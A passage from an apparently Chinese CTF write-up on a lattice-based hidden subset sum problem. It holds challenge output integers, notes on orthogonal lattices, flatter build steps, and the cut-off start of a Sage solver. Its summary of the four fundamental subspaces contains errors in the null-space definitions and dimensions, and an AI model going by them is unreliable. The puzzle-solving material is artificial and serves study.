18434625855226899883321256831367130395454266215612264702708075963791303925781592538547918831568109391525493791354981671339894441519904308962763998161987029013446729670718008148129133450351098070931554566261249895846253603636590459596, 4836589882106604573232223783562904282390113141134832184116904820708055678518566213625282539739120591243833386887356618441208163640057659125158988736716688790394207262106963544742980383712576206460105345350538386057072108474044619762, 6151404576887692192610418168194331069192875548920158964829022752513950390283339567156423340910687221576158002429133456052555654098031826362939557645155801837456631388169151822830860248697122438884510698830753889483429000372055663270, 1574957139018125716198556939124476979519175929549560352017864438659995599753619766161008956285299169458623403378359963178580562501544136272165783563207087197050431991062774440640781210997705052555763881548707362577843167934254303211, 17391739152895538066781672275956234672907920242794599378833168697429044919890739257714041398214783661258560907470027798397029764878415624758336877129671514678297353821687758143698229059859378874838953846176893688321578130610211565286, 22442775423196539068158317596467259088950472981582207880432855826287481502251341833382328178251544577017724250630849093658390304250535679234308101654761044939170582837625840089519904382455956192527790359472609400260135910142621984804, 7748145694686025228235215160750244287356340902395751036047680266668756996397350960420787060972587276915359606276766739777861347852878339037039524614848022448512348644599427802285464351651684733130472167279398416173868476456640343912, 968331055615348886946161174142596323259279195401290249125471421855394873300085582575869103540417932149745449924520552363175883831558583706411049245922455751591766401028527194162506783887475373042174297269540922518114299818971515732, 4074196420936964179766581964556249617600508808814880297307983370447540931003863746901029660929911106973066021649873857071560682302121391895434719968587180495592648327726491322805723227506930292583988197314499826859508435423130136511, 19864987974362234107843653929873500108136815262278445784737257026822472090684137983310497635654575899271214537322575710548691021536061053470964176925313591634748257211956578723604063519794172805717329303553656399286725199286782179098, 5980232223078727426630626502373985853071880541561981005218776841139298756434767290311430618487388592202253565417179231192022611316234657898418924157525655172678865435399101556073022390243434214511995519696285633065317753437363140899, 9821319966095560427870562540391515794742864976782463778999916398549075070208007164914970520077561657764076828409003343933376170855999484408246466687946900127907046008389427535470321658506118424459143900724118409798821454695603532413, 7827061760058169599128916445957168975571796630781465189931078722702870872684431267074675693818964100116677523139537724577680225755195092012197924786849023733994256374790421775024816070942174050947871976107979562435932865310494883087, 22444668052197480392921780325089923182285523366742407483346175183018618880471398182443968590402259809874065978185849126448188342895030137619253767196685974598148578223227750661256523638369688545340957145235941267699205041015976512893, 20917044400441994043876270524213483352610260969649420453302372823720482527762724079002988257467288936795890599751896104615953448223734081092408051311403775183351145101060024221646952031995834916254264079757831184110975778281092887507, 23140912538412009642128425132684342938279634667238702284276382497865489723993571612771587585503991716334178974558961918251076413896005571217843917697675846778156724083976226196922651714668362270739315887073416139790810854613161221205, 22777946012556717221075832833653666836629416861635512682775171879258070731828427066106777275170219181994163961386136705459389933201518366302644543778363562846466085257052188326159339853787923581481741947880793477699405480147382158494, 23851586262216165721855485651763540041901511489076454491269387584732596518981375859161694969885462872348599346737087824666606523489542019629415264018415534655453799899565276989370343113997814318338527314054146555972083061531585827540, 20241416376929699761750802558413112170873703541929048761197148717657034619071841172624649616126693643941848760178381682942801111935776714336673825991096083096572342885484491597788757271226301779632972642169838769965985177058217188038, 2692623658541928573101809574838111935515631623595566809258680332737841700723177581136913483180407761165968252907913185839978546543265283140651614694449288264776969017249235506292038168449124679820126351493857549856356121231151653092, 16131290371505918809335910442479495479841565683249366748358361988494535045927568460325417586137766570965946466933319709361295018081273755953428838543656376509391831612977590017091825515705947022941510609863748269022738241991112543488, 1335160611734517210645206538933135972937544803451806751759630093284405592061360484816228430621641176590985805245868699739008511603795763736239195005005100364118036164638319077433065549088587459341808702399982456843190373618829758380, 10340884655343139837671785768186602936214734136755477567866586190929922502684799328216935326848576904458087728141043911084892486564116287640011646899861462113035901153299622043759499282128564846901160241967532876328459689814413762415, 5401801998031885667933094843069088272827013350970253067554899772704793572618267277623489486460813952487852750203234532174602055095351744072948091510037938518921258719623872400909307218937680691436513657947420608446304518643433543806, 22418868106953255259925166180079659279224737549892921884878026172626266645583784111270814808165875702359326672598830454977959663875880390431168563609899967914132355212711052456153248630704103482626553682618348908416775395116183421160, 20136816925897836048772212824296976042694611960736454057157846271343943360453902970773845024303002259554524096897822838253842365660027362116226399377625905232718459877264554224090369414896236479377060541879764953830249057877045251555, 417007008641601538653131077937620123593549306092323725176317590989242946892864900660489655668904173115128836432434611768470228830641521176358301458746585411902484062496874795344596497020100855878780454061487570562235412769427686317, 9816475565441529661291824775139176002345288049562161459635217819610547571837959753097093100495711176071908644218955109371081139417135838663380195844736613456931438981238662973400611171398897919439637129498647633743885607728861261845, 23870935413324621348274921404095042947875585668987906695837586539050798799854533446390296432839375770804268047327372595660396408173256820274722381200344879062334763587710033759647191441214875827380395128531108963710853637847394865713, 5298283449173550237355629570588050847341460771573182634769894887770904533264599629995486512196147997419360308122234130045379554651637311836030578449665827917483073270459896882565258770161952823438641471340977976030370479284643371508, 9100837458325934090298687047369486564792435663532832334039514867133941164867094239825017906066058129874353079407264039259148505190526558442923936093553694722216375206807028548669491820363396636679859686397489340148773407722045937270, 17038367322359956199612085432647045245163774933791813550948476894306406589837225702818847799733173871855718021202472793156228757158103629792922793811988464842161571581127798138726439413898369919443095650665934234847679938496501082548, 5299931840319151047971338206132253854280031927943516805614636255095356530922613677536304699331683053630885588152231978881663325811744339303687716269251042135117691288866254176400980454233864302175455006617533230769750479680704003803, 12540635716642138050069818430585456163343167481815665545278957523114902416154894156857128176013092728156227339170914675236740354318471661079175938598595792244472546173729361758589747726406890065450274035377585868728685758016648252277, 20322491326674638034817966107240137846880079505122662915547658066684133128524680689280031204806726531719600178717407242432128474388718978132706799940782382379254141734042970031880774214699826014425312091260412469194792303194943312541, 5229662284467342488041460575057606427352459717204043541086271154843521129291284032127069339383360917307751194492229261239447923171449428855700540788480851171076934541793501678873893328468428087126295294243102629336566344072435148926, 3285838812530358897545298545597343176030011766358309208184051849657687130054651377685203521819371289947496722092598297091948769435961363706612789578094785479539087879764936323884232849776769800582357588276204554212787884397356609075, 985977908000415897087132935158491952560421294051636567544225622494066414580751745182595887079757589173529845207284035227594010385666914234516531594517789212163680139291972549513242975229837531367529730153966350998393964527190960780, 17065146968215067842383191941447787644924233733406612558491157934810641836558863455012704342178343064915019207439623922379811619035308569771475626867167513169039770149329185353910699976605853826239989744767067695675074282642081109122, 2895051855443032500114264954131824950223016860747135906862021873334133780972247856024289082902593614686234940918908254535652058807083890041131819711987908379837879596740736424457497974785551048832507207236105596543909624181876322785, 4966900790205893074984989386646008103784297431600598682180814393416207374789387128394225554960559580907084765584389900080293673527269787068249734379554225965935987198682993924271078260562548541634568301366120953043703261984185035492, 1592133000317447857415093607791358078761029097913126706492340352416015371109359886156333987922914888082815145772272973546014967400910445408277918663315594917464634596929536938549199769536365664240519962382595777686556467574333228524, 17035537442662976504922683848715751125264550470049558142661773195755584861517729792053865084739966511957660313727319368149881218522960763762882305808684597990343444747248688404053255935943475864000546643886973794872661260510687280843, 20111698260990344511260405765344080240651285550598954249450996243164491354537997138010932667983387259244493313206064965234304942238230370889100484896673506193390990108890409994241977323914015682399152387423870735159707545233977076770, 4426576652391016795551419713890251009257497077843566944171223794376085011499334139845631881967064569788805218564609553883159372200439972546448048186839777176955653678061337638263702524915401358923560309463124850203968200337852733276, 3556250500712518687819416837629333029165286228062203447561280347508137816614314590932355942707292725328412737236278928580181418156388443710572944973186708461884059491603304783359925238797793594138717291455747294198397870200166947926, 13927320217504747590335052600456317522959386643781341454614326945183478241960544334007376807495121099323703009105189096866855842836770860884311107587040596788037191865762444816790052342380928760217895549688851330716204287404367303487, 19186706038001453829669717777125450932916146002197133081093772142153667138769734136853279989523987832968428625917578008444184262747837927970709245398651581065254203234844684953377568872969107656958355470030477893423131898072422756183, 22381665099391547182936913521847282760348471609353024967760382743808171185913404603975224381726387826288857667025325668082188366555603105557245157448683625346209348265965221897830928437651540759787451097803683602952136978886939848108, 23184966822032599428052602150557101983764751770509578032863780766266522607517592773626111822041493293258042973530264981559695260799033791203372990411009256833559380777212487382283059963062596935284684661031645172162024478226204363138, 16539088490461420703816947102632424948425515660257887809146011235917654678378412523179508616742234368055968310509283732191870030434582732164093099360112011742236459025255884663476536960498964609417125524793004880729910317951965592813, 10627113729566322150048832232683529097355980196490682036544275502457617404334634120165915692104820767017442741956545228542857367270650462946535492128265700535237871862208669509649325009158507616860442008149873107060741021076888884760, 11267125954054697421607144060487028030315221416724761783980425416225401414438268312062546288659852252620731439408156918787311722449792469512045947674206376022808235573921725655145722130002570628702790325686485651094520806647889697625, 4911205202815908515692837431520549683777169253252777007455111883806834073795531698553219580184313225825960948113399800474452261317070334272323032740707835989017948524378048478488428489385565965079763692393689501989320254467985218131, 18225583119089116078692515199163462711367659128624273031302797819688898542857154391879994381461943991555355016609793957171277566919134542789018572504987813438201233787367785338009025648567150953656694093846485220700745696812633035006, 17124234213957098698230284828489924705668475635880795070226911783064579553649755246615473501361642779526435236563455406701400112606551296644981809412927868935422016140603302419472851331702007217744308865951784508265319879878806395169, 18320622251591902268884471566945908729088619624449744135372454032601565510002933121047617779525906112324014260307172465674892213050531659488423104916770768335565948080253402637642044778885182266582275200106953222049633752308706688551, 24457930433564457945771787755968680104666213881444206925098794328782195040157980540838735926561759082225194223736014415351949112479640317187344000165121092686793374287372748091561901721804318156288437459491612736032622243568349516093, 22265804749164546901938171648091768389896829971403003545856878651484500077757482148788299901736948904123686203689202942240180132163143143705283033061770635205827882648633512344457848245098258829095489702543948367764867928232044824058, 18900161492491534779787443646293787626820709943533292051383245169379565231395076945117775620635775969975846765953606343974869577606827971998219045983071563019684594799478738283866960338845191273042733578885765920385538754923673408889, 17889473980262621507727589927197778641872127889134833323841551214539716290976451403348274752633422499728496096883243584042483628894269754398553184329718324889293596658429101772287592368674172804565689105678473019975243407244443523354, 18138536284390228585222991677635066336042468881007408937551554888609804713475952148185850060713096062490706359461940944964671776206024172923126363065585750055088818712488848481717124019308269329827427616383247328426589265783755119376, 6941686913634391288204116641020549765180362394639046952833583665887465570267538795546804523595813342836355168483856050240026251188294030485167045415709628881383778040727359450383956568568106721584184411199839996521253684993422751259, 22992006670212126764824193120058634657001604914414004734821248527368854522227019382280730391923555175806134471061931935927053165225097789175365530407921340026367729574881159034848504162017932940755494323686314491075117479953225503887, 18889844572592402977165311575773286867467454462925891168417511513423729217044120249821731533209860082071111083322002901596453361922574290712584585358411669740150626541648939895944226132920890088469550610507895808585359727591914206085, 6666655710468005649706184115723573365251462187673059249738512161994399275840373987561227970751250766584800647042039279477404087065060050644628381828583861242380931211664820415435317452066274782819115003184163730581681622864948821194, 24442788363614702478160454433556682777614538285899274650364570324147929577042693651515379466649305846727056159265579376386821157221997188678366720354117931257791747671854293025636726315130814360325435461139608811317126380758851246545, 3789221993484155913559741664728461223403980965496397955689870284919836847677745452749044838420054969057924618819059401422484788710618185075911294609519545068730398520559177215399107660641538049803271554736571292247686379194750320543, 21873850228341807328959395050233093703169880159289173724757394227136978403580890202395540529330163397068220942284403794709107289189710029361455418998025336530860787357934895975567129810177776409058257987618326850995771554675384004597, 17536041541204934014076526920758665113043740624193969731730744258387807070596104489532717517216000563908854506010662434077584634386355186944716702706942442940731251780893620899779245846595551333147659316055919062256480970701655279627, 19407120068778690141403380026131453596861551386369479396230505390227653872677134054561992820557367774198282874395704720779245370294312934155682385859613278432890305085004312799356060179682815696304771052136896088704751922242630198409, 22188335278745941318611538342309792101807036715704960353260517879118066222777745210659900238277928630140699521308316838275971289200263131258234641581549364021537324405919384058988041517229292916261500788540253262281872145817866534201, 7747714826763088285107541247818316037397421767027668051138855493363116460000955397824452361102671411632490114848836371357604866226227424954470624642731987025316172767218592207709740356830011790713079523783872784305872540656392291746, 19887371972318133855851604678702556011249418604536222675471406387964064156556715238854177545520609871225101077916367584660715220549065088085292416996064161705548027357359433864169349493060754312050979210446959542252897590259359350334, 8294906413533132168404300931946413998240080166871907188094515783201644742263173979787881022523424957539034934314850416306063309934742997700326726155063016581522865298074769968348111017554707292410938898142597066728208428380878750421, 1653105970991953482899537672062357513065378236063390275343931334625408241297427898336232902361937430133831999674424825099913436268711104010735434651657677108868699978197850769122830586350740906726462895350121007949545664795947860864, 12269618263727745774471362344937708112433146558452944102120330036342787834859494830666143669909939653466690789351178557153188487424122505279563071471514459806106274249298197080596758790096134028357329959992410153187970554647619693992, 1872864619889940685338328801003331116116324125207518914355262445073138404081944205799436751349615602533951192776172397206414216844642872435584612569950411851258148106436686594672345335783969547344634731455993264276684131388107925671, 4513749312512251880604514209077948498027702413440182534839908928178574977910770106795841023217134659344590190863364646266789330386820741397846745980903894024071570509233767128940445989174470003283523091184905302986968451776421561662, 8603337256650354725901662878660176754144664298844747341704003399121600657022664528563551640960916587386129786478309164700432759539464086939903495957787444834354374817296692466731788081058771312703991550181427467022305370277303346983, 23365631034822686706848861837664149512381852299460219050905837202265319818470354800644904900148269920728421546208860389463045551971738217073763540025131975146762487532728885828048839528343788216251920714889888039142680073032018209305, 6607639177853302945854914419510931096388217686583645225143255416189057140379688783625576347008665489422690692808119043773336416572630490641290112319256251209477866830470853168722398019123553430625117729213654554816567713513779344415, 4561566327415935118011554902890982069222860765432388797764984409579792338453618355071397274166466983322420193457204472449461675131240004294130210782759565785798599897601429158065284397449217928577095159769164431353199244868487488744, 20619847566560770217922342108991907691804433910319321142515967407002608932724027977344243536552779741744666018384832452860273148472189048802133349097819957587715301234453466408609901385057101082861479087744559457433976694471408546305, 22491152451840917724221614919594852240132461240517952298400459039237731967027207477770343934142858535807374120125597482004629528875275878346918715932552067774911528110269427267812617484848108111673621932638514453993119718582330140747, 6666474094256099454100470843004001323138491057011536304234976312925807717978405285549794760174974472283543425259849525001185866616280751670606879171557999380642875418172376311718234199272738593712030842861381513444395743918038821115, 14608023366653031088088792776473398626003159629342147637827411108620737788956808756326109569015343711267053685351058998420052502241372531064676603977272048298276216817941298853114867422633812368586103057778170425202194117767754667631, 5252337957400533023141552935190055167419769967624364557832824989834270839854871010838982035707949070995760254952770763066280166814341995798204623431763701829339076952532980539368056515029226923915153022281011140366638060437110366739, 10904306109950562384969710342212030523791112657561334466651023805904078236093287424426677767985064640606514094696576993583613088268461193986220871599701879363215462244945655373954510358026604779860047706432984563536661200078510932373, 271089870966054382062547940599302930208391511305619529931792046885517009708743599677262187984628732739879872484565903195651986883825927888971937651058489837590922157961189702574478434079284762530056683899140620405502763587815843988, 3829615989110076770296742506036176782165844942888782102108951362367146757383686834342989617169804679903591543207522172730554226315074929853710799018658501869041610918943093181700178445519770897725094255926846625256047131752654342562, 21027069518507812270143295031343563349093839199401621816244376936177926406132628307142702486126954172154048366960790803112488498869107125453199712698252176721555768481489241348715849630405805925617213192771837043429514738827417144886, 5881226757843642195966565964653582492820888457331393664539176000660786662815235967860466787943573661827208152609810786722095379797141818015319613457329828625393487501781946972038205996869901009867952429000678385538000284430630706236, 2521923938150189454600306942991910693184006998559434655516630180847991419680039647290350012029220409131874146647660269259895592069243379722647318881158750588650781231049664374429790092745270054520174713929014178340596950439728274560, 8758376499045186974759666603979237567667197537852772637677888896808075273558089282554848789332514021133259149957700137612055862632797830595621934651217892115186467411149352513292138952986429910931491409905668759362630065098560911595, 13191199724136555502957890679396614709016857839416803538397351651347130464502168341817424021127860042268678297183870891307490573812114364969054434627925544210247121163167379363424886928897494782573687523127714204264997876190602437253, 9045856550177265391220629158731617749010212836864098283122546582777883404294009743353817729777617793271710052997379493755741026807844934814727246295235951284912102541728263662595501946149955917048457614526081296501462068421827852976, 6459798973338438966900179181532933692034227569421041783473328776170587260589076396376191246924415837088205177319039971420829034696713874472602132191625410039341612568435551413702295547566220164641447295285720082107354915094875081603, 18130944169824976249131646693653229887900178060915303504243600146230275474872733740668972937137157219543732643704650107251416696945179838232545698726143250813322229855629104391962459755248646534545048139897036809559137651958948270079, 19433961868269193358322214141454667980688775311251629909509283331435001571001860372018368696521955762539089964314003195187700700564577856756527331858387859373880454698968805785663462845204498347648129595364259940616740397244612865478, 8454342596590308643274924755539741595287236546135227564272399966865185286500856241479821014846217497777600310284414611127622114813445233725529927188907572438103992229319436467881065607514441060358976822819421059737228474840057614047, 14537166469005975467747810118162809545827718830406398577270708204918464068241632461987018145489192528509346426457951388255954213424031104985101166216842931291037542011588336951147195358280734815984408580846906869482480502971976426377, 9864795106799668524939736197424521439591891686815014975959473174387504259559952345678395376176078540246526852734596130277519239749484404961484185022437705083689017218701798637167021350243461787680837042187852481891194754984735656290, 12268133299486497651766039892370828813185008783433000037986132221788291415226868620238438503015954126875051172591613715198127704843911983953450929112840971801607634064818730678605607306766453120283358084710064351726230220427399762639, 23200293260215743474524683129751336070441250470963131048954888782126750470082228197816325916628408311922916070082220789486560209004492220118951431198612457889003386630810956350904331757934144293620423858054842692246457187748735062656, 12185058234910532038606592923943044720835384475056406568591532299474530796146503312961639492038042022391680648709583314649821462809663154713418981695840590138378051933292810301094804670835915971975595283960175012458013597273267021942, 11221105904027102766755866944349650081668300046041215931102172400146372526930032156540201468901690818353993076628146864056758574315777576911062494908066762717748155624173988281018555785467232120361958052665957065342986661851276430394, 14146479366643851658329966290610820831402901507964825251479961487541976561960526129163043068554159234344763780262866371744837633699714330248498751352953049997609901897424160840833140698818737335558582310519215832295749211043181569006, 1996209659684880945362862072520668750990547266260431838906384808543405104055069952622618300300584240886900690277630290717169515463002827197894865638271520372178286783553830032501282265213469285397161533556619830350317766403742420992, 18745628006242526136845741349836299919853199739283471770759301677399688289987875667803750091491715203157411890157519643639106751973250183741642640909721507627190884945027790857100678267316925707699884380178101491613670302697083954620, 19418124148220580953761208919068176633948651831328159315391336734636206569887918413082885761812646760978293757398100953133069513030393015847333774689093510445461709841109234535067235898760285824847288504459882411280759715216659582800, 5205682801846809078199714774495380248428185583858806868224581963484209052697538736798790170636398029956181045671089079103657022469597301960581764542974628895184611312183649377529274963873896667201796079779944709584465505596525070672, 23318768639095847871012848772328512763678546109012363992365106641654912272868317312950662675004405062658308032988874110659096548795362930763210615993811303468541570030170160830706399273680692451111580339813777985874728526448601728258, 17663789897713399391329553205656192714527376624862805232162724262629896080514601476156211759120575400809873039830798687701631183863013915733500151932198747020557039729241833096695716114234461112493415456068786767133227958219632605915, 6830010105417894382101110089036680793557109559922111774917409457675491199721642329811584508061936118348231576993991198201242451125213981421233318599225362440072543796138016876550674700452496965047853603139044680407212592626251990309, 20884460900376572824292657271126142123485873790799680755215209134586191820305715480424778276376315900396541154319924699294552460109641193882916333508408848926700539891286011495861364148628583978468945538773985039022758906702197824639, 13531065912700180655643696503956611973995564881435960456381267408672878851671401491817614667804495339344405932207053507762953305764605332944268933111663238888239497791369102852051383458023784915387358708364653218605556527945192953446, 2553816611900270571668114455889943878175117814334437639644905418648197398024478749479929249928897268004570330988939190446533589567173538978234848074204808696098346906993745527874980173125711310145943264700663446068878853419141256703, 7702946127422572691818763664478853337162137782960611620730689560076482803756508559755597150108497423141643340665369251108221062530372412417632117367040091322406174387044200677890005382248858884236589435161310662150368144113087162028, 856622736471280804557194626008729500444312593564382589268324938301776962060843602449805587925812237957752880785112568949132663694077910582967771689119118364920441406196093341412299290918890444268129746265100558792934176787213952281, 13085724187735251902990250756196209600908652053725281294139610919151379144531851103633380912533710102796299853358725400239404987942390816511761529807030939893292168306351094697881403177421950694992263386572648775597583744415784239571, 7100689265695650020381992634740648600984998939714583113848881850701106459614914817851311196581107346332066792064189719153254177748385971715393193581611667136269465698799421805822480100454812068626009149069638986161533799798537549504, 4467099588802620474242283665232546701197788121100881304650783900944358367934303538647332945119694362849091301355005436291078223280753310654713741596387831313076907729367513905299597582977894859084467382251110232442313588731567517722, 5473046296972118327495477534670327059922805992783858593704621531789283121351554409848948934507912406403962506436068909023098369828879491079777608783858939477692990976926108359125684410236904067532064874993279097186185155662101906258, 13591367045303817756921606989622272393926672486200768156018816106702906007663207108105253090224421463114966486892454772900918694500736413865138170304122425783415795355698366106633741954984452451151018930441346568620455282531777867950, 12837435207992697390990569032560187426481997222586386722777778699242138971828789676884863577995903428553893241998604229610814215105950418432582043279620338868532002049158799146484208974875466555076583060832418045530228962180626040480, 7316640175294137713314869727957150382096738798129711776743606346914726499175960701433782404417244551378443800105185050713536694756151112399465628411989410218214135853671061537891268154389537857467508049690878544281069813159134447208, 5151376884557358987102680932801796401429637582605742653829100435795121709703076330975777361528309737649265350014534395043422641886613936452263244119523616000835976669901180725907500239783554884160601160568746329677044574260523365548, 5544576622940386549335576865087877596617926099466042134500548634035376720895126959440244093852186422501431889949044217654362265128303553015621478863491100875988057958166746762260378217552569885430432535094758534858841379918068187007, 14799083878004905781143009556442469081112262413659889639288955718256084634190461545010854679353463115437573577978160713007284612958005397981521383647283702964407693130299777274799243953236030640570493768398572551239990227306733506160, 132844788313325827023495191003662944917431930932901448945118978538428738126330451739237066558502122063099809045229187297346109539648216961234175022847902983869276754945800449898074085412283494856067025963252580204722767954611258179, 9997725379291207116745319316287400946107564644091980910563413554119585263470477093970564227161564056288461504072778119028907789906500076760472149102049287538406258735529830965640424425566731939511108199132607994947515509428756592559, 14646376958061531925518831995658673407931262101501970446265549357832773749183019186120219286620900718201222809743448147362429133751090137661872964022623647740154174784462365444772177633656555414706757146904500779085225231797377050144, 16961346690251629621986345424487239681148326635080182277543308482323385918405862092823934592459138523058683934777987371593649364181974320355468882733898473293716092586268920136699107300230769779047091693711423641803330962855097096925, 2618594245402239609420638325588710628729298505557767536783081437084561636188823448848608313088279895767614513680617644960939796227640357345879653043764575378231433481016175403223796690453962090038403036583909367766156025584252164203, 16129071855649587728956130797915283397821444682369014639788931828703405001025452386772618008541361124591860437269977673096643234091339097919538256670714042876788038021148787313041232229195101391115617710413115586617903468179658293636, 9296460193370583816070265591004199836116409032475859821958373154648206416256688852532615798871909770401306092671009539709487113538354105710364096048695663733075506988691991440779198012260316123759636997605427235081435477049705160552, 1356766159480311231046092117641588893355352105595481615726950290176811339998878309107970938869998059989877968402614403581962019949583734460209881480875822282448127936842922015950977040552638984243226561237288675211033594559512352433, 19197695297715405687227248527900901092786200526800375602428770624109373871809940359427277921210632597272639018938714964263079621574904896862536158251668755864087715415463131002786745060027810126535070270462254705453473599741763642828, 11504919294119244522634617029097854228866432223952020614427505589799731544252763714133524362716131837287869956783968056158486948361614604723869397483955281379172665969413312233383788159684735115665749332738234882920695449340309379522, 18136748881313347797489256490303008973958797121502583070872297973410283357173931060145003395290313809639159364452878423212404968100529416632370960280991488248897643385077173546644657216962479904853980225967792378564740955618790869689, 22555443333166977522691347301347007560400051480503434282172981846969595435546624498334336147388425749569732805395419970503066627849315134643618856767862223712319227590572187001545137380352712433069385477809940371396279834624165048444, 19332410102472644041731759226399070707013106727087481077728390364392367890410961009071561108596168685943298518353047413086954964804844094391018967334543408778135737715163542892702469367908397906585577557910294555212057020330243744038, 17177417284468945229490862308619539417109492506914913062877431832846296734201442477935598961820079857431068892933310664489209467455843404117024994948398426037991145460135427180175565761835499766689618253941365562391662494080561342044, 879611534766674063001632328710680301710464497091520920338941691285492779988149399177086528073474651179894297281827841186309099576047175634809922453338033325127493237666384356566986210156156953604218009901589731044248652021118031620, 23901207038202622707599557245612794049853792927287360450027492049407851837113641371314557090659548570609882944974639719117613653182109642059819516444307658547936689472901123537159776992389462316392381501838566991389570490374017025518, 7294655103119575652652322286451546582028529239995283561722077129773315845389577738996103704019032108880990669128684769525902413906863125164280686381766699292160785541839733876768365575818004233647829515890263347139003166333882303265, 8199949148068603717078157517861527127346508355755818050198576663971835822831527608360661637977726638149791394376076411543777469889828576151097728735193348069053034445800818498132875303434000618724830859612380606691308333135184789022, 12932127055873709636118977200718753643697619875736929170699115793566554057840448101626698069421491300195262169693063575726920790612681778762496689371363586507749098405216335541209813518577176560833970043581650697105699549343835699165, 9917293893368177421397475427602509319278773672321383411846980082270699518174858223780569843589979834443168760567064326549648560205061679870738748816216468066517782541276129041173215780179108422815701857032247139868407259633376154559, 6485828831888305306081814677813540588127941945945034779245913009780868830245510314875533356179894354966906340154886875373143060627077170845158967404313883218225671724777853809740370308868692781589580666606866945869996719967294318732, 19119951246631217104039346142695133667127595492295413599863780403588391811741379549048868909966290463800864082020118315313386877862668618823502190910178365164478013264098319748585627290011516370646420391829298524728641913535537536764, 13215772369693604102761934975932281069170694713655356522695565074039936506383846119163879883348265869353744569056003177315023138985010016601208933546975222998897707503967398686672700803569601825514347043442257463097499547507964305449, 1824804736849693701490461807874708098331129810367417218087931080176315035870555627969047286436604549231593492189121553958901210913466534815129733115561941853007429568739121822292088591127010504328963864942012956577043433126898293277, 6776240363305734174388141780584391816477723528084755437932934198907331150157541368203589425111306785868566064140117304971940704620271781717831300158164114203169466745769627304177491937036545708540956189334174616021603617610568750468)<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p><strong>参考：</strong></p><p><a href="https://0xffff.one/d/2077">HSSP与正交格学习笔记 - 0xFFFF</a></p><p><a href="https://huangx607087.online/2025/02/21/Hgame25/#6-SPiCa-8pts-21sol">Hgame25 - huangx607087’s Blog</a></p><p><strong>HSSP问题：</strong></p><p>$A\vec{x}\equiv\vec{b}\mod p，已知\vec{b}和p，而A（0,1矩阵）和\vec{x}（向量）未知。$</p><p><strong>四大基本子空间：</strong></p><ul><li><p><strong>行空间：</strong> $A\vec{x}&#x3D;\vec{b}$中，所有$\vec{b}$构成的空间，此时A的每一行构成空间的基底向量。</p></li><li><p><strong>列空间：</strong> A$\vec{x}&#x3D;\vec{b}$中，所有$\vec{b}$构成的空间，此时A的每一列构成空间的基底向量。</p></li><li><p><strong>左0空间：</strong> 满足$\vec{x}A&#x3D;\vec{0}$的所有$\vec{x}$构成的集合，在sagemath中为 <code>A.left_kernel().matrix()</code>。其个数为m-r+1，r为A中互相线性无关的行向量个数。</p></li><li><p><strong>右0空间：</strong> 满足$\vec{x}A&#x3D;\vec{0}$的所有$\vec{x}$构成的集合，在sagemath中为 <code>A.right_kernel().matrix()</code>。其个数为n-r+1，r为A中互相线性无关的列向量个数。</p></li></ul><blockquote><p><strong>性质：</strong> <strong>行空间</strong>和<strong>右0空间</strong>正交，<strong>列空间</strong>和<strong>左0空间</strong>正交。</p></blockquote><p><strong>问题解法：</strong></p><ul><li><p>对已知给定的向量$\vec{h} \mod M，$首先找与$\vec{h}$垂直的m-n个短向量$\vec{\mu_i}$</p></li><li><p>使用$\mu_i$构造格$L_{\frac{1}{x}}$，用$L_{\frac{1}{x}}$找到$L_x$的正交补$\overline{L_x}$</p></li><li><p>对$\overline{L_x}$使用BKZ恢复$x_i$</p></li></ul><blockquote><p><strong>附上Arch Linux中安装flatter（加速格规约）步骤：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pacman -S gmp mpfr eigen base-devel gcc git cmake<br>git <span class="hljs-built_in">clone</span> https://github.com/keeganryan/flatter.git<br><span class="hljs-built_in">cd</span> flatter<br><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> ./build<br>cmake -DCMAKE_INSTALL_PREFIX=/usr ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></blockquote><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-comment">#正交格</span><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>  